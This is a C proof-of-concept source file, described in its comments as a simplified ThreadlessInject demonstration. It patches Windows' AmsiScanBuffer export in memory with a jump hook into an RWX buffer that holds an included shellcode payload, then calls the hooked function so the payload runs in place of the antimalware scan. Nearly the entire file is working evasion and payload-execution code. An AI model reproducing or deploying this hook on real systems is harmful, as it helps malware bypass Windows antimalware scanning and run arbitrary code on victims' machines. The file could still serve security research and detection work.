#include <windows.h>
#include <stdio.h>
#include "../common/payload.h"

// Simplified ThreadlessInject PoC: Hooks an export of a loaded DLL in the target process.
// Instead of complex remote hooking, we hook local amsi.dll for demonstration.
int main() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if(!hAmsi) return 1;
    
    FARPROC pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if(!pAmsiScan) return 1;

    void *exec = VirtualAlloc(0, payload_len + 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload, payload_len);

    // Hook AmsiScanBuffer: mov rax, exec_addr; jmp rax
    BYTE hook[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0};
    *(void**)(&hook[2]) = exec;

    DWORD old;
    VirtualProtect(pAmsiScan, sizeof(hook), PAGE_EXECUTE_READWRITE, &old);
    memcpy(pAmsiScan, hook, sizeof(hook));
    VirtualProtect(pAmsiScan, sizeof(hook), old, &old);

    // Trigger the hook (this will execute payload instead of amsi scan)
    void* result;
    ((HRESULT (WINAPI *)(HANDLE, PVOID, ULONG, LPCWSTR, HANDLE, PVOID*))pAmsiScan)(NULL, NULL, 0, NULL, NULL, &result);

    return 0;
}
